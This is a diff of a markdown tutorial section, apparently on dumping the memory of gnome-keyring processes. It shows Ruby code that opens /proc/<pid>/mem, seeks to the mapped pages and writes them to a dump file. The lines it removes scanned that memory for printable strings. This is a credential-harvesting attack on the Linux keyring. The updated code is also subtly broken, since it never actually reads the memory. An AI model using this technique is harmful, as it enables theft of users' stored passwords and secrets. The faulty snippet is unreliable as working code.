@@ -53,23 +53,15 @@ end
 **Get processs memory pages:**
 
 ```ruby
-memory_dump = []
+memory_dump = ''
 
 @pids_maps.each do |pid|
-  begin
-    chunk_pointer = File.open("/proc/#{pid[:pid]}/mem", 'rb')   # Open mem file
-    chunk_pointer.seek  pid[:memory_start]                      # chunk_pointer.seek(memory_start)
-    memory_dump << chunk_pointer
-                       .read(pid[:chunk])                       # Read mem file
-                       .scan(/\x00{1,2}[[:graph:]]{4,}\x00{1,2}/)    # extract strings between \x00\x00 (the pattern of useful strings)
-                       .map{|str|str.gsub(/\x00/, '')}          # remove \x00\x00 from found strings
-  rescue Errno::EIO, RangeError
-    next
-  rescue  Exception => e
-    pp e
-    pp e.backtrace
-  end
+  chunk_pointer = File.open("/proc/#{pid[:pid]}/mem", 'rb')   # Open mem file
+  chunk_pointer.seek  pid[:memory_start]                      # put reading pointer where page starts
+  memory_dump << chunk_pointer
 end
+
+File.open('gnome-keyring.dump', 'wb') {|f| f.print memory_dump}
 ```
 
 
